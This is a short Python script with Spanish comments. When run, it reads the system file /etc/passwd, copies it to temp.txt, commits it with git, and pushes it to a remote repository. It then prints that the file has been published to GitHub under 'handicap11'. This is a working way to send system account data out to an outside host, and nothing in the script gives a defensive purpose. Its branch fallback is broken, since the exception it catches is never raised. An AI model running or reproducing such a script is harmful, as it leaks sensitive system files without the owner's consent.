import subprocess

def run():
    archivo = '/etc/passwd'
    mensaje_commit = 'Archivo passwd en GitHub'

    with open(archivo, 'r') as file:
        contenido = file.read()

    repo_nombre = 'handicap11'
    archivo_en_repo = 'passwd_backup.txt'

    with open ('temp.txt', 'w') as temp_file:
        temp_file.write(contenido)

    subprocess.run(['git', 'add', 'temp.txt'])
    subprocess.run(['git', 'commit', '-m', mensaje_commit])
    
    # Verificamos la existencia de la rama "main"
    try:
        subprocess.run(['git', 'rev-parse', '--verify', 'main'])
        branch_name = 'main'
    except subprocess.CalledProcessError:
        branch_name = 'master'
    
    subprocess.run(['git', 'push', 'origin', branch_name])

    print(f'Archivo {archivo} publicado en GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')

# Llamamos a la función run()
run()

